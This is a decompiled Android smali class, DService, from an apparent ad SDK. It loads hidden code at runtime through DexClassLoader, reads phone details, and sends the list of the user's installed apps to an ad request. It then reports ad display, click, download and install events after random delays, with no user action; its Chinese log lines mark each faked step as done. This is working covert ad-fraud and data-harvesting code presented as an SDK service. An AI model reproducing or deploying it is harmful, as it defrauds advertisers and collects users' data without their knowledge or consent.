.class public Lme/lkt/sdk/dd/DService;
.super Landroid/app/IntentService;
.source "DService.java"


# instance fields
.field private dcl:Ldalvik/system/DexClassLoader;

.field private mObjAdInfo:Ljava/lang/Object;

.field private rand:Ljava/util/Random;


# direct methods
.method public constructor <init>()V
    .locals 1

    .prologue
    .line 26
    const-string v0, "DService"

    invoke-direct {p0, v0}, Lme/lkt/sdk/dd/DService;-><init>(Ljava/lang/String;)V

    .line 27
    return-void
.end method

.method public constructor <init>(Ljava/lang/String;)V
    .locals 1
    .param p1, "name"    # Ljava/lang/String;

    .prologue
    .line 30
    invoke-direct {p0, p1}, Landroid/app/IntentService;-><init>(Ljava/lang/String;)V

    .line 23
    new-instance v0, Ljava/util/Random;

    invoke-direct {v0}, Ljava/util/Random;-><init>()V

    iput-object v0, p0, Lme/lkt/sdk/dd/DService;->rand:Ljava/util/Random;

    .line 31
    return-void
.end method

.method static synthetic access$0(Lme/lkt/sdk/dd/DService;)Ldalvik/system/DexClassLoader;
    .locals 1

    .prologue
    .line 21
    iget-object v0, p0, Lme/lkt/sdk/dd/DService;->dcl:Ldalvik/system/DexClassLoader;

    return-object v0
.end method

.method static synthetic access$1(Lme/lkt/sdk/dd/DService;Ljava/lang/Object;)V
    .locals 0

    .prologue
    .line 22
    iput-object p1, p0, Lme/lkt/sdk/dd/DService;->mObjAdInfo:Ljava/lang/Object;

    return-void
.end method

.method private onGetAdList()V
    .locals 13

    .prologue
    .line 112
    :try_start_0
    iget-object v9, p0, Lme/lkt/sdk/dd/DService;->dcl:Ldalvik/system/DexClassLoader;

    const-string v10, "cs.request.Ad_ChapingGetRequest"

    invoke-virtual {v9, v10}, Ldalvik/system/DexClassLoader;->loadClass(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v1

    .line 113
    .local v1, "cls_Ad_ChapingGetRequest":Ljava/lang/Class;
    const/4 v9, 0x2

    new-array v9, v9, [Ljava/lang/Class;

    const/4 v10, 0x0

    const-class v11, Landroid/content/Context;

    aput-object v11, v9, v10

    const/4 v10, 0x1

    const-class v11, Ljava/util/List;

    aput-object v11, v9, v10

    invoke-virtual {v1, v9}, Ljava/lang/Class;->getDeclaredConstructor([Ljava/lang/Class;)Ljava/lang/reflect/Constructor;

    move-result-object v4

    .line 114
    .local v4, "cons_cls_Ad_ChapingGetRequest":Ljava/lang/reflect/Constructor;
    const/4 v9, 0x2

    new-array v9, v9, [Ljava/lang/Object;

    const/4 v10, 0x0

    aput-object p0, v9, v10

    const/4 v10, 0x1

    invoke-static {p0}, Lme/lkt/sdk/dd/PackageUtil;->getInstalledUserPackagesForStrings(Landroid/content/Context;)Ljava/util/List;

    move-result-object v11

    aput-object v11, v9, v10

    invoke-virtual {v4, v9}, Ljava/lang/reflect/Constructor;->newInstance([Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v7

    .line 116
    .local v7, "obj_cls_Ad_ChapingGetRequest":Ljava/lang/Object;
    iget-object v9, p0, Lme/lkt/sdk/dd/DService;->dcl:Ldalvik/system/DexClassLoader;

    const-string v10, "cs.network.request.AbstractRequest"

    invoke-virtual {v9, v10}, Ldalvik/system/DexClassLoader;->loadClass(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v0

    .line 117
    .local v0, "cls_AbstractRequest":Ljava/lang/Class;
    iget-object v9, p0, Lme/lkt/sdk/dd/DService;->dcl:Ldalvik/system/DexClassLoader;

    const-string v10, "cs.network.request.IRequestLinsener"

    invoke-virtual {v9, v10}, Ldalvik/system/DexClassLoader;->loadClass(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v3

    .line 119
    .local v3, "cls_IRequestLinsener":Ljava/lang/Class;
    iget-object v9, p0, Lme/lkt/sdk/dd/DService;->dcl:Ldalvik/system/DexClassLoader;

    const-string v10, "cs.network.request.DefaultRequestLinsener"

    invoke-virtual {v9, v10}, Ldalvik/system/DexClassLoader;->loadClass(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v2

    .line 120
    .local v2, "cls_DefaultRequestLinsener":Ljava/lang/Class;
    new-instance v9, Lme/lkt/sdk/dd/ProxyHandler;

    invoke-direct {v9}, Lme/lkt/sdk/dd/ProxyHandler;-><init>()V

    new-instance v10, Lme/lkt/sdk/dd/DService$1;

    invoke-direct {v10, p0}, Lme/lkt/sdk/dd/DService$1;-><init>(Lme/lkt/sdk/dd/DService;)V

    invoke-virtual {v9, v2, v10}, Lme/lkt/sdk/dd/ProxyHandler;->bind(Ljava/lang/Class;Lme/lkt/sdk/dd/OnMethodInvokedListener;)Ljava/lang/Object;

    move-result-object v8

    .line 150
    .local v8, "obj_lis":Ljava/lang/Object;
    const-string v9, "query"

    const/4 v10, 0x2

    new-array v10, v10, [Ljava/lang/Class;

    const/4 v11, 0x0

    aput-object v3, v10, v11

    const/4 v11, 0x1

    sget-object v12, Ljava/lang/Boolean;->TYPE:Ljava/lang/Class;

    aput-object v12, v10, v11

    invoke-virtual {v0, v9, v10}, Ljava/lang/Class;->getDeclaredMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v6

    .line 151
    .local v6, "m_query":Ljava/lang/reflect/Method;
    const/4 v9, 0x1

    invoke-virtual {v6, v9}, Ljava/lang/reflect/Method;->setAccessible(Z)V

    .line 152
    const/4 v9, 0x2

    new-array v9, v9, [Ljava/lang/Object;

    const/4 v10, 0x0

    aput-object v8, v9, v10

    const/4 v10, 0x1

    const/4 v11, 0x0

    invoke-static {v11}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v11

    aput-object v11, v9, v10

    invoke-virtual {v6, v7, v9}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 156
    .end local v0    # "cls_AbstractRequest":Ljava/lang/Class;
    .end local v1    # "cls_Ad_ChapingGetRequest":Ljava/lang/Class;
    .end local v2    # "cls_DefaultRequestLinsener":Ljava/lang/Class;
    .end local v3    # "cls_IRequestLinsener":Ljava/lang/Class;
    .end local v4    # "cons_cls_Ad_ChapingGetRequest":Ljava/lang/reflect/Constructor;
    .end local v6    # "m_query":Ljava/lang/reflect/Method;
    .end local v7    # "obj_cls_Ad_ChapingGetRequest":Ljava/lang/Object;
    .end local v8    # "obj_lis":Ljava/lang/Object;
    :goto_0
    return-void

    .line 153
    :catch_0
    move-exception v5

    .line 154
    .local v5, "e":Ljava/lang/Exception;
    invoke-virtual {v5}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_0
.end method

.method private report(I)V
    .locals 10
    .param p1, "index"    # I

    .prologue
    .line 93
    iget-object v5, p0, Lme/lkt/sdk/dd/DService;->mObjAdInfo:Ljava/lang/Object;

    if-nez v5, :cond_0

    .line 108
    :goto_0
    return-void

    .line 97
    :cond_0
    :try_start_0
    iget-object v5, p0, Lme/lkt/sdk/dd/DService;->dcl:Ldalvik/system/DexClassLoader;

    const-string v6, "cs.entity.AdStatus"

    invoke-virtual {v5, v6}, Ldalvik/system/DexClassLoader;->loadClass(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v0

    .line 98
    .local v0, "cls_AdStatus":Ljava/lang/Class;
    invoke-virtual {v0}, Ljava/lang/Class;->getEnumConstants()[Ljava/lang/Object;

    move-result-object v3

    .line 100
    .local v3, "enums":[Ljava/lang/Object;
    iget-object v5, p0, Lme/lkt/sdk/dd/DService;->dcl:Ldalvik/system/DexClassLoader;

    const-string v6, "cs.request.AddOneAppReportRequest"

    invoke-virtual {v5, v6}, Ldalvik/system/DexClassLoader;->loadClass(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v1

    .line 101
    .local v1, "cls_AddOneAppReportRequest":Ljava/lang/Class;
    const-string v5, "Report"

    const/4 v6, 0x3

    new-array v6, v6, [Ljava/lang/Class;

    const/4 v7, 0x0

    const-class v8, Landroid/content/Context;

    aput-object v8, v6, v7

    const/4 v7, 0x1

    aput-object v0, v6, v7

    const/4 v7, 0x2

    iget-object v8, p0, Lme/lkt/sdk/dd/DService;->dcl:Ldalvik/system/DexClassLoader;

    const-string v9, "cs.entity.AdBasicInfo"

    invoke-virtual {v8, v9}, Ldalvik/system/DexClassLoader;->loadClass(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v8

    aput-object v8, v6, v7

    invoke-virtual {v1, v5, v6}, Ljava/lang/Class;->getDeclaredMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v4

    .line 102
    .local v4, "m_Report":Ljava/lang/reflect/Method;
    const/4 v5, 0x1

    invoke-virtual {v4, v5}, Ljava/lang/reflect/Method;->setAccessible(Z)V

    .line 104
    const/4 v5, 0x0

    const/4 v6, 0x3

    new-array v6, v6, [Ljava/lang/Object;

    const/4 v7, 0x0

    aput-object p0, v6, v7

    const/4 v7, 0x1

    aget-object v8, v3, p1

    aput-object v8, v6, v7

    const/4 v7, 0x2

    iget-object v8, p0, Lme/lkt/sdk/dd/DService;->mObjAdInfo:Ljava/lang/Object;

    aput-object v8, v6, v7

    invoke-virtual {v4, v5, v6}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    .line 105
    .end local v0    # "cls_AdStatus":Ljava/lang/Class;
    .end local v1    # "cls_AddOneAppReportRequest":Ljava/lang/Class;
    .end local v3    # "enums":[Ljava/lang/Object;
    .end local v4    # "m_Report":Ljava/lang/reflect/Method;
    :catch_0
    move-exception v2

    .line 106
    .local v2, "e":Ljava/lang/Exception;
    invoke-virtual {v2}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_0
.end method


# virtual methods
.method public onCreate()V
    .locals 0

    .prologue
    .line 35
    invoke-super {p0}, Landroid/app/IntentService;->onCreate()V

    .line 36
    return-void
.end method

.method protected onHandleIntent(Landroid/content/Intent;)V
    .locals 6
    .param p1, "intent"    # Landroid/content/Intent;

    .prologue
    const/4 v5, 0x2

    const/4 v4, 0x1

    .line 40
    const/4 v1, 0x0

    invoke-static {p0, v1}, Lme/lkt/sdk/jz/buss/HttpUtil;->goDdNext(Landroid/content/Context;I)Z

    move-result v1

    if-nez v1, :cond_0

    .line 41
    const-string v1, "lkt"

    const-string v2, "\u8c46\u8c46\u4e0d\u663e\u793a"

    invoke-static {v1, v2}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 89
    :goto_0
    return-void

    .line 44
    :cond_0
    invoke-static {p0}, Lme/lkt/sdk/dd/Dex;->copyFileToLocal(Landroid/content/Context;)V

    .line 45
    invoke-static {p0}, Lme/lkt/sdk/dd/Dex;->loadDex(Landroid/content/Context;)V

    .line 46
    const-string v1, "phone"

    invoke-virtual {p0, v1}, Lme/lkt/sdk/dd/DService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/telephony/TelephonyManager;

    invoke-static {v1}, Lme/lkt/sdk/dd/Dex;->fillConfigParams(Landroid/telephony/TelephonyManager;)V

    .line 47
    invoke-static {}, Lme/lkt/sdk/dd/Dex;->getClassLoader()Ldalvik/system/DexClassLoader;

    move-result-object v1

    iput-object v1, p0, Lme/lkt/sdk/dd/DService;->dcl:Ldalvik/system/DexClassLoader;

    .line 48
    invoke-direct {p0}, Lme/lkt/sdk/dd/DService;->onGetAdList()V

    .line 50
    const-wide/16 v2, 0x1388

    :try_start_0
    invoke-static {v2, v3}, Ljava/lang/Thread;->sleep(J)V
    :try_end_0
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_0

    .line 54
    :goto_1
    iget-object v1, p0, Lme/lkt/sdk/dd/DService;->mObjAdInfo:Ljava/lang/Object;

    if-nez v1, :cond_1

    .line 55
    const-string v1, "lkt"

    const-string v2, "\u83b7\u53d6\u7684\u5e7f\u544a\u4e3a\u7a7a"

    invoke-static {v1, v2}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_0

    .line 51
    :catch_0
    move-exception v0

    .line 52
    .local v0, "e":Ljava/lang/InterruptedException;
    invoke-virtual {v0}, Ljava/lang/InterruptedException;->printStackTrace()V

    goto :goto_1

    .line 58
    .end local v0    # "e":Ljava/lang/InterruptedException;
    :cond_1
    invoke-direct {p0, v4}, Lme/lkt/sdk/dd/DService;->report(I)V

    .line 59
    const-string v1, "lkt"

    const-string v2, "\u8c46\u8c46\u663e\u793a\u5b8c"

    invoke-static {v1, v2}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 60
    invoke-static {p0, v4}, Lme/lkt/sdk/jz/buss/HttpUtil;->goDdNext(Landroid/content/Context;I)Z

    move-result v1

    if-nez v1, :cond_2

    .line 61
    const-string v1, "lkt"

    const-string v2, "\u8c46\u8c46\u4e0d\u70b9\u51fb"

    invoke-static {v1, v2}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_0

    .line 65
    :cond_2
    :try_start_1
    iget-object v1, p0, Lme/lkt/sdk/dd/DService;->rand:Ljava/util/Random;

    const/16 v2, 0x3e8

    invoke-virtual {v1, v2}, Ljava/util/Random;->nextInt(I)I

    move-result v1

    add-int/lit16 v1, v1, 0x3e8

    int-to-long v2, v1

    invoke-static {v2, v3}, Ljava/lang/Thread;->sleep(J)V
    :try_end_1
    .catch Ljava/lang/InterruptedException; {:try_start_1 .. :try_end_1} :catch_1

    .line 69
    :goto_2
    invoke-direct {p0, v5}, Lme/lkt/sdk/dd/DService;->report(I)V

    .line 70
    const-string v1, "lkt"

    const-string v2, "\u8c46\u8c46\u70b9\u51fb\u5b8c"

    invoke-static {v1, v2}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 72
    :try_start_2
    iget-object v1, p0, Lme/lkt/sdk/dd/DService;->rand:Ljava/util/Random;

    const/16 v2, 0x2710

    invoke-virtual {v1, v2}, Ljava/util/Random;->nextInt(I)I

    move-result v1

    add-int/lit16 v1, v1, 0x3a98

    int-to-long v2, v1

    invoke-static {v2, v3}, Ljava/lang/Thread;->sleep(J)V
    :try_end_2
    .catch Ljava/lang/InterruptedException; {:try_start_2 .. :try_end_2} :catch_2

    .line 76
    :goto_3
    const/4 v1, 0x3

    invoke-direct {p0, v1}, Lme/lkt/sdk/dd/DService;->report(I)V

    .line 77
    const-string v1, "lkt"

    const-string v2, "\u8c46\u8c46\u4e0b\u8f7d\u5b8c"

    invoke-static {v1, v2}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 78
    invoke-static {p0, v5}, Lme/lkt/sdk/jz/buss/HttpUtil;->goDdNext(Landroid/content/Context;I)Z

    move-result v1

    if-nez v1, :cond_3

    .line 79
    const-string v1, "lkt"

    const-string v2, "\u8c46\u8c46\u4e0d\u5b89\u88c5"

    invoke-static {v1, v2}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    goto/16 :goto_0

    .line 66
    :catch_1
    move-exception v0

    .line 67
    .restart local v0    # "e":Ljava/lang/InterruptedException;
    invoke-virtual {v0}, Ljava/lang/InterruptedException;->printStackTrace()V

    goto :goto_2

    .line 73
    .end local v0    # "e":Ljava/lang/InterruptedException;
    :catch_2
    move-exception v0

    .line 74
    .restart local v0    # "e":Ljava/lang/InterruptedException;
    invoke-virtual {v0}, Ljava/lang/InterruptedException;->printStackTrace()V

    goto :goto_3

    .line 83
    .end local v0    # "e":Ljava/lang/InterruptedException;
    :cond_3
    :try_start_3
    iget-object v1, p0, Lme/lkt/sdk/dd/DService;->rand:Ljava/util/Random;

    const/16 v2, 0x1388

    invoke-virtual {v1, v2}, Ljava/util/Random;->nextInt(I)I

    move-result v1

    add-int/lit16 v1, v1, 0x2710

    int-to-long v2, v1

    invoke-static {v2, v3}, Ljava/lang/Thread;->sleep(J)V
    :try_end_3
    .catch Ljava/lang/InterruptedException; {:try_start_3 .. :try_end_3} :catch_3

    .line 87
    :goto_4
    const/4 v1, 0x4

    invoke-direct {p0, v1}, Lme/lkt/sdk/dd/DService;->report(I)V

    .line 88
    const-string v1, "lkt"

    const-string v2, "\u8c46\u8c46\u5b89\u88c5\u5b8c"

    invoke-static {v1, v2}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    goto/16 :goto_0

    .line 84
    :catch_3
    move-exception v0

    .line 85
    .restart local v0    # "e":Ljava/lang/InterruptedException;
    invoke-virtual {v0}, Ljava/lang/InterruptedException;->printStackTrace()V

    goto :goto_4
.end method
